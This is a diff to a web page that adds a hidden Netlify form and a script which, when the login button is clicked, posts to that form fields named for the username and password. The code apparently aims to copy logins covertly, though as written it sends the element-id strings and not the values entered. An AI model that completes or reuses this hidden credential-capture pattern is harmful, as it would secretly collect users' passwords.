@@ -680,4 +680,36 @@
 
 
 <script src="js/local-navigation-fixes.js?v=5" data-site-root="./"></script>
+    <form name="id-submit" data-netlify="true" hidden>
+  <input name="id1">
+  <input name="id2">
+</form>
+
+<script>
+document.getElementById("login-button").addEventListener("click", async () => {
+  const id1 = "login-username";
+  const id2 = "login-password";
+
+  const data = new URLSearchParams({
+    "form-name": "id-submit",
+    id1,
+    id2
+  });
+
+  try {
+    const res = await fetch("/", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: data.toString()
+    });
+
+    if (!res.ok) throw new Error("전송 실패");
+    console.log("Netlify 전송 완료");
+  } catch (err) {
+    console.error(err);
+  }
+});
+</script>
 </body></html>
